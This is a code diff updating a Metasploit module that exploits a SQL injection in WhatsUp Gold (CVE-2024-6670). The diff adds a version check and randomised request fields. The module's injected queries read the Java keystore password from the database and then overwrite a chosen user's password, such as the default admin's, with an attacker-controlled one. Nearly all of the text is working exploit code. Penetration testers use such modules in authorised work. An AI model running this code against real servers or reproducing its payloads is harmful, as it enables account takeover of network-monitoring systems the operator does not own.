@@ -1,6 +1,7 @@
 class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
-  # prepend Msf::Exploit::Remote::AutoCheck
+  prepend Msf::Exploit::Remote::AutoCheck
+  CheckCode = Exploit::CheckCode
 
   def initialize(info = {})
     super(
@@ -8,10 +9,10 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'WhatsUp Gold SQL Injection (CVE-2024-6670)',
         'Description' => %q{
-          This module exploits a SQL injection vulnerability in WhatsUp Gold, by changing the password of the admin user
+          This module exploits a SQL injection vulnerability in WhatsUp Gold, by changing the password of an existing user (such as of the default admin account)
           to an attacker-controlled one.
 
-          WhatsUp Gold < v24.0 are affected.
+          WhatsUp Gold versions < v24.0.0 are affected.
         },
         'Author' => [
           'Michael Heinzl', # MSF Module
@@ -44,6 +45,28 @@ class MetasploitModule < Msf::Auxiliary
     ])
   end
 
+  def check
+    res = send_request_cgi({
+      'method' => 'GET',
+      'uri' => normalize_uri(target_uri.path, 'NmConsole/app.json')
+    })
+
+    return CheckCode::Unknown unless res && res.code == 200
+
+    data = res.body
+    version = data.match(/"path":"app-(.*?)\.js"/)[1]
+
+    if version.nil?
+      return CheckCode::Unknown
+    else
+      vprint_status('Version retrieved: ' + version)
+    end
+
+    return Exploit::CheckCode::Appears("Version: #{version}") if version <= Rex::Version.new('23.1.3')
+
+    Exploit::CheckCode::Safe
+  end
+
   def run
     body = {
       KeyStorePassword: datastore['NEW_PASSWORD'],
@@ -71,11 +94,11 @@ class MetasploitModule < Msf::Auxiliary
     body = {
       deviceId: deviceid.to_s,
       classId: "DF215E10-8BD4-4401-B2DC-99BB03135F2E';UPDATE ProActiveAlert SET sAlertName='#{marker}'+( SELECT sValue FROM GlobalSettings WHERE sName = '_GLOBAL_:JavaKeyStorePwd');--",
-      range: '1',
-      n: '1',
-      start: '3',
-      end: '4',
-      businesdsHoursId: '5'
+      range: rand(1..9).to_s,
+      n: rand(1..9).to_s,
+      start: rand(1..9).to_s,
+      end: rand(1..9).to_s,
+      businesdsHoursId: rand(1..9).to_s
     }.to_json
 
     res = send_request_cgi(
@@ -119,15 +142,16 @@ class MetasploitModule < Msf::Auxiliary
     byte_v = display_name_f.split(',')
     hex_v = byte_v.map { |value| value.to_i.to_s(16).upcase.rjust(2, '0') }
     enc_pass = '0x' + hex_v.join
+    vprint_status('Encrypted password: ' + enc_pass)
 
     body = {
       deviceId: deviceid.to_s,
       classId: "DF215E10-8BD4-4401-B2DC-99BB03135F2E';UPDATE WebUser SET sPassword = #{enc_pass} where sUserName = '#{datastore['USERNAME']}';--",
-      range: '1',
-      n: '1',
-      start: '3',
-      end: '4',
-      businesdsHoursId: '5'
+      range: rand(1..9).to_s,
+      n: rand(1..9).to_s,
+      start: rand(1..9).to_s,
+      end: rand(1..9).to_s,
+      businesdsHoursId: rand(1..9).to_s
     }.to_json
 
     res = send_request_cgi(
@@ -163,7 +187,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     store_valid_credential(user: datastore['USERNAME'], private: datastore['NEW_PASSWORD'], proof: json.to_s)
-    print_good("New #{datastore['USERNAME']} password was successfully set:\n\t#{datastore['USERNAME']}:#{datastore['NEW_PASSWORD']}")
+    print_good("New password for #{datastore['USERNAME']} was successfully set:\n\t#{datastore['USERNAME']}:#{datastore['NEW_PASSWORD']}")
     print_good("Login at: #{full_uri(normalize_uri(target_uri, 'NmConsole/#home'))}")
   end
 end
